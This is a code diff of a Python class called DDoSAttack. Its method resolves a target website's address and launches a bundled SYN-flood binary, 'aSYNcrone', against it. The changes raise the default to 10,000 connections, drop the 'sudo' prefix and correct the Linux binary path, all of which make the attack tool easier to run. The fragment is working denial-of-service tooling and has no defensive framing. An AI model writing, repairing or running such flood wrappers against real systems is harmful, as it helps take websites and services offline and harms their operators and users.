@@ -13,7 +13,7 @@ logging.basicConfig(
 
 
 class DDoSAttack:
-    def aSYNcrone_attack(self, target_url, target_port, num_connections):
+    def aSYNcrone_attack(self, target_url, target_port, num_connections=10000):
         platform_type = self.detect_platform()
 
         if platform_type:
@@ -21,7 +21,6 @@ class DDoSAttack:
             hostname = parsed_url.netloc
             ip = socket.gethostbyname(hostname)
             command = [
-                "sudo",
                 platform_type,
                 "80",
                 ip,
@@ -56,7 +55,7 @@ class DDoSAttack:
                 os.path.dirname(__file__), "DDOS/aSYNcrone/aSYNcronemac"
             )
         elif sys.platform == "linux":
-            return os.path.join(os.path.dirname(__file__), "aSYNcrone/aSYNcrone")
+            return os.path.join(os.path.dirname(__file__), "DDOS/aSYNcrone/aSYNcrone")
         else:
             logging.error(f"Unknown platform: {sys.platform}")
             return None
